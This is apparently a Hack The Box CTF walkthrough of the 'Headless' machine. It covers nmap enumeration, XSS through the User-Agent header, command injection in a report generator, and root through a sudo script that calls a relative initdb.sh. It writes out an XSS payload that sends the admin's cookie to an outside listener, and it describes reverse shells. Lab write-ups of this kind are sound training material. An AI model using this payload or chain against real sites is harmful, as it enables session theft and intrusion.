---
title: 'HTB - Headless'
author: themarkib
date: 2024-05-14 20:55:00 +0800
categories: [Hack The Box, CTF]
tags: [aws,subdomain,bugbounty]
---


Hello Guys,

It’s me Bikram Kharal back in medium to write about the Seasonal machine of the Hack The Box.

**Initial Enumeration**

First of all i did a simple nmap scan to enumerate all the ports in the box.

`nmap -sC -sV Machine_IP -T4`

![](https://miro.medium.com/v2/resize:fit:700/1*MJt4tOeHyJ8cjDkQfIMHVw.png)

I found that open ports are 22 and 5000.

I saw that port 5000 is running a web service.Visiting that location we got a interface like below:

![](https://miro.medium.com/v2/resize:fit:700/1*FU5nflGiSZrCvBcjkvQMhw.png)

Clicking on  `For questions`  button we got a interface to contact support.

![](https://miro.medium.com/v2/resize:fit:700/1*dm3g5T30TT7x6BEbVkvMjA.png)

By seeing this page i started adding random values and intercepted the proxy with burpsuite.

When i added a simple XSS payload in message section we got prompted with ‘Hacking Attempt Detected.

![](https://miro.medium.com/v2/resize:fit:700/1*HXtpWv91oz0Zz7BkQI2pzA.png)

I suspected that this web service was vulnerable to XSS vulnerability.But no any value send via contact support are getting reflected.

After researching for few minutes , I tried injecting XSS payload in the User-Agent Section and surprisingly it got fired.

![](https://miro.medium.com/v2/resize:fit:700/1*iWoZjJX2cQ1m8RJkB1S5uQ.png)

Now we need to find and construct a XSS payload to steal the cookies of an admin.

After adding below payload on the User-Agent and i started my python server as shown below.

<img src=x onerror=document.location="http://10.10.14.57:8000/?c="+document.cookie>

![](https://miro.medium.com/v2/resize:fit:700/1*UyEkcG0LgNhz5IEpAz26tg.png)

And finally we got admin cookie.

Using admin cookie i again tried to bruteforce the directory if we could get useful path using ffuf.

![](https://miro.medium.com/v2/resize:fit:700/1*vcZ_Rt2LQDqTxwRqBkNyKw.png)

Yes, We got /dashboard path using the admin cookie.

I tried to access the dashboard and interface was like:

![](https://miro.medium.com/v2/resize:fit:700/1*MzOTGQFGqV97R9QI03GMnw.png)

I clicked on  `Generate Report`  button and intercepted the request with burp proxy.

I initially I tried to inject command injection payload and we got the response immediately.

![](https://miro.medium.com/v2/resize:fit:700/1*Gu0A6_MSa2TzO-fa95QK8A.png)

Now it’s time to get reverse shell :)

![](https://miro.medium.com/v2/resize:fit:700/1*MM-iuwMBNg9toggqum0RRQ.png)

Going 1 directory back we got a user.txt

![](https://miro.medium.com/v2/resize:fit:694/1*unCHnlw2UqL8QY8Ha7e8TA.png)

**Post Exploitation**

I tried basic Linux privilege escalation techniques.Using  `sudo -l`  we found that `usr/bin/syscheck` without sudo password.

![](https://miro.medium.com/v2/resize:fit:700/1*QHAWXRiyENKXMoMWPeuvlw.png)

Reading the code of  `syscheck`  file i found that it is running `initdb.sh` file with sudo privilege.

I instantly created a new file called  `initdb.sh`  with reverse shell payload and i runned that  `/usr/bin/syscheck`  file and we got our shell with sudo privilege.

![](https://miro.medium.com/v2/resize:fit:700/1*iBy4UvztV26_vDDlJ87-wA.png)

Thank you all for reading.

Till then Happy Hacking :)